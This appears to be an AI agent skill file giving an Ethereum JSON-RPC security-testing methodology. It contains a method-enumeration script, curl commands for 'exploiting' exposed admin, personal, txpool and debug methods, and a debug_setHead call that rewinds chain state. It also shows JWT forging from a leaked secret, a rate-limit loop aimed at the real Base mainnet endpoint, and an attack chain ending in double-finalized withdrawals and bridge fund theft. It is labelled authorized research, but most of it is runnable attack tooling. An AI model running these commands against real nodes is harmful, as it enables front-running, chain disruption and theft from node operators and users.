---
name: ethereum-json-rpc
description: "Ethereum JSON-RPC security testing methodology for authorized research. Covers: method namespace taxonomy (safe public vs dangerous admin/personal/debug/miner/txpool), systematic method enumeration script (distinguishes -32601 method-not-found from -32602 invalid-params), exploiting exposed methods (admin_nodeInfo → network recon, personal_listAccounts → account discovery, txpool_content → front-running/MEV, debug_storageRangeAt → private variable read), node authentication mechanisms (network/transport/application/method levels, JWT auth since The Merge for Engine API), sequencer-specific testing (OP Stack optimism_syncStatus/outputAtBlock/rollupConfig, rate limiting, admin method enumeration on L2 sequencer RPC), attack chain: JSON-RPC exposure → sequencer manipulation → bridge exploit."
trigger_keywords: "ethereum json rpc, eth rpc, json rpc security, admin nodeinfo, personal listaccounts, debug sethead, miner start, txpool content, debug storagerangeat, rpc method enumeration, ethereum node security, geth rpc, rpc authentication, jwt rpc, engine api, rpc admin exposure, rpc namespace, admin_nodeinfo, personal_unlockaccount, debug_sethead, txpool_inspect, ethereum rpc audit, node rpc test, sequencer rpc, base rpc, op stack rpc, rpc rate limit"
version: 1.0
created: 2026-02-25
owner: cyber-operator
---

# Ethereum JSON-RPC Security Testing

## Purpose

Audit methodology for Ethereum node RPC exposure. Supports sequencer testing (Base/OP Stack) and general node security assessment. Authorized research only.

---

## Method Namespace Quick Reference

```
SAFE for public exposure:
  eth_blockNumber, eth_getBlockByNumber, eth_getBlockByHash
  eth_getBalance, eth_getTransactionCount
  eth_getTransactionByHash, eth_getTransactionReceipt
  eth_call (read-only), eth_estimateGas, eth_gasPrice, eth_getLogs
  eth_sendRawTransaction (user-signed txs only)
  net_version, net_listening, web3_clientVersion

DANGEROUS if exposed:
  admin_*      — Node management (peers, data directory, internal info)
  personal_*   — Wallet operations (unlock, send, sign)
  debug_*      — Internal state (trace, rewind chain!, storage read)
  miner_*      — Mining control (start, stop, etherbase)
  txpool_*     — Mempool visibility (pending/queued transactions)
  clique_*     — PoA consensus management
  parity_*     — Parity-specific methods (historical)
```

---

## Systematic Method Enumeration Script

```bash
TARGET="https://rpc.target.com"

methods=(
  "admin_nodeInfo" "admin_peers" "admin_addPeer" "admin_removePeer" "admin_datadir"
  "personal_listAccounts" "personal_unlockAccount" "personal_newAccount"
  "personal_sendTransaction" "personal_sign"
  "debug_traceTransaction" "debug_traceBlock" "debug_setHead"
  "debug_storageRangeAt" "debug_gcStats" "debug_memStats" "debug_freeOSMemory"
  "miner_start" "miner_stop" "miner_setEtherbase" "miner_setGasPrice"
  "txpool_content" "txpool_inspect" "txpool_status"
  "clique_getSigners" "clique_propose"
  "eth_sendTransaction"
  "parity_allTransactionHashes" "parity_pendingTransactions"
  "engine_forkchoiceUpdatedV3" "engine_getPayloadV3"  # Engine API (should need JWT)
)

for method in "${methods[@]}"; do
  response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"$method\",\"params\":[],\"id\":1}")

  error_code=$(echo "$response" | jq -r '.error.code // empty')
  result=$(echo "$response" | jq -r '.result // empty')

  if [ -n "$result" ] && [ "$result" != "null" ]; then
    echo "✅ ACCESSIBLE: $method"
    echo "$response" | jq .
  elif [ "$error_code" = "-32601" ]; then
    echo "❌ NOT FOUND:  $method"
  elif [ "$error_code" = "-32602" ]; then
    echo "⚠️  EXISTS:     $method (invalid params — method enabled!)"
  else
    echo "?  UNKNOWN:    $method → $(echo $response | jq -r '.error.message')"
  fi
done
```

**Key distinction:**
- `-32601` = "Method not found" → method is DISABLED
- `-32602` = "Invalid params" → method EXISTS and is ENABLED (but needs correct params)

---

## Exploiting Exposed Methods

```bash
# admin_nodeInfo — network recon + version fingerprinting:
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"admin_nodeInfo","params":[],"id":1}' | jq .
# Returns: enode URL, internal IP, listen port, client version, protocols
# Impact: Network recon, version-specific exploits

# personal_listAccounts — discover accounts with funds:
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}' | jq .
# Returns: list of addresses managed by this node

# txpool_content — front-running / MEV:
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"txpool_content","params":[],"id":1}' | jq .
# Returns: all pending + queued transactions (gas prices, calldata)
# Impact: front-running DEX swaps, sandwich attacks, transaction analysis

# debug_storageRangeAt — read private contract variables:
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0","method":"debug_storageRangeAt",
    "params":["latest", 0, "0xCONTRACT_ADDRESS", "0x0", 100],
    "id":1
  }' | jq .
# Returns: raw storage slots → can read "private" Solidity variables
# Impact: bypass access control via state visibility

# debug_setHead — REWIND CHAIN STATE (catastrophic if exposed):
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_setHead","params":["0x1000"],"id":1}'
# Returns: null (if successful) → chain is now at block 0x1000
# Impact: replays withdrawal proofs, double-finalize withdrawals (Critical for L2)

# admin_datadir — filesystem path disclosure:
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"admin_datadir","params":[],"id":1}' | jq .
# Returns: filesystem path → info for further exploitation
```

---

## Node Authentication Mechanisms

```
Level 1 — Network: firewall rules, VPN, security groups
Level 2 — Transport: TLS (encrypts, no auth), mTLS (client cert required)
Level 3 — Application: JWT, API key header, HTTP Basic auth
Level 4 — Method: method whitelist per client, per-method rate limits

Testing authentication presence:
  1. Send request without auth → check if it succeeds
  2. Send with incorrect auth → check error type
  3. Check if some methods require auth while others don't
     (mixed auth = partial protection → test each dangerous method individually)
```

### JWT Authentication (Engine API)

Since The Merge, EL-CL communication via Engine API uses JWT:

```bash
# If you can read the JWT secret file (on the node's filesystem):
JWT_SECRET="$(cat /path/to/jwt.hex)"

# Generate JWT token:
pip install pyjwt
python3 -c "
import jwt, time, secrets
secret = bytes.fromhex('$JWT_SECRET')
payload = {'iat': int(time.time())}
token = jwt.encode(payload, secret, algorithm='HS256')
print(token)
"

# Test Engine API with JWT:
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -d '{"jsonrpc":"2.0","method":"engine_forkchoiceUpdatedV3","params":[...],"id":1}'

# CRITICAL: If Engine API accessible WITHOUT JWT → allows forkchoice manipulation
```

---

## OP Stack / Sequencer-Specific Testing

```bash
# Base public endpoint:
BASE_RPC="https://mainnet.base.org"

# OP Stack-specific methods:
curl -s -X POST "$BASE_RPC" -d \
  '{"jsonrpc":"2.0","method":"optimism_syncStatus","params":[],"id":1}' | jq .
# Returns: sequencer sync status, L1 origin, safe/unsafe L2 head

curl -s -X POST "$BASE_RPC" -d \
  '{"jsonrpc":"2.0","method":"optimism_outputAtBlock","params":["latest"],"id":1}' | jq .
# Returns: outputRoot, stateRoot, withdrawalStorageRoot

curl -s -X POST "$BASE_RPC" -d \
  '{"jsonrpc":"2.0","method":"optimism_rollupConfig","params":[],"id":1}' | jq .
# Returns: chain config, bridge contract addresses, sequencer address

# Rate limiting test:
for i in $(seq 1 200); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" \
    -X POST "$BASE_RPC" \
    -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":'$i'}'
done
# Watch for: 429 (rate limited), latency increase, connection drops

# Run full method enumeration against sequencer RPC:
TARGET="$BASE_RPC"
# (Run the enumeration script from above)
```

---

## Attack Chain: JSON-RPC → Sequencer → Bridge Exploit

```
Chain: debug_setHead → withdrawal replay → fund theft

Prerequisites:
  1. debug_setHead is accessible on Base sequencer (should NOT be)
  2. Attacker has a previously finalized withdrawal

Attack:
  1. Call debug_setHead to rewind sequencer to block before withdrawal finalized
  2. Sequencer reverts finalizedWithdrawals state
  3. Attacker calls finalizeWithdrawal again on L1
  4. Withdrawal executed a second time → funds stolen

Impact: Critical
Severity: Highest (drains L2 bridge)
Evidence required: RPC response + block number reversion + double-finalization tx

Note: This is a theoretical chain — production nodes should have debug_setHead
disabled and Engine API behind JWT. Report any exposure immediately.
```

---

## Quick Assessment Workflow

```
1. Run method enumeration script (10 min)
   → Identify any accessible admin/personal/debug/miner/txpool methods

2. For each accessible dangerous method:
   → Attempt exploitation (commands above)
   → Assess severity per impact

3. Check Engine API:
   → Test without JWT → if accessible = Critical
   → Test with JWT from leaked secret → if accessible = Critical

4. Sequencer-specific (Base/OP Stack):
   → Test optimism_* methods
   → Check for debug_setHead (Critical)
   → Rate limit assessment

5. Evidence collection:
   → Save raw request/response for each finding
   → Note: IP, port, discovered method, response payload, impact
```

*Crypto-Native Batch CN-4 | ingested 2026-02-25 | Target: OP-Stack node infrastructure*
